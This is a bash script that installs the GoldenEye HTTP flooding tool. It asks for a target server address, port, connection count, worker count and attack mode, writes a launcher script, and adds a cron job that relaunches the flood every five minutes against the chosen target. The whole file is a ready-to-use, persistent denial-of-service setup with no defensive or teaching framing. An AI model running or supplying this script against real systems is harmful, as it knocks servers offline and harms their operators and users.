#!/bin/bash
# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\e[36m'
NC='\033[0m' # No Color

apt-get update && apt install -y -q wget curl cron git psmisc
clear
echo -e "${RED} Cloning GoldenEye...${NC}"
cd
git clone https://github.com/jseidl/GoldenEye.git
cd GoldenEye
clear

echo -e "${RED} GoldenEye Configuration: ${NC}"
read -rp "$(echo -e ${CYAN})Enter Full Target Server ip or domain: $(echo -e ${NC})" address
read -rp "$(echo -e ${CYAN})Enter Target Server Port: $(echo -e ${NC})" port
read -rp "$(echo -e ${CYAN})Enter number of connections per worker: $(echo -e ${NC})" connections
read -rp "$(echo -e ${CYAN})Enter number of workers: $(echo -e ${NC})" workers
read -rp "$(echo -e ${CYAN})Enter Attack Mode (get, post, random): $(echo -e ${NC})" mode

echo -e "${RED} Setting up GoldenEye... ${NC}"

cat > script.sh <<EOF
#!/bin/bash

killall script.bash
./goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode
EOF

chmod +x script.sh
echo -e "${RED} GoldenEye Setup Finished. ${NC}"
clear
echo -e "${RED} Creating Cronjob...${NC}"
clear
function addtocrontab () {
  local frequency=$1
  local command=$2
  local job="$frequency $command"
  cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
}
addtocrontab "*/5 * * * *" "bash /root/GoldenEye/script.sh"
echo -e "${RED} Cronjob Created. ${NC}"
echo -e "${RED} Setup Finished Successfully. Adios. ${NC}"
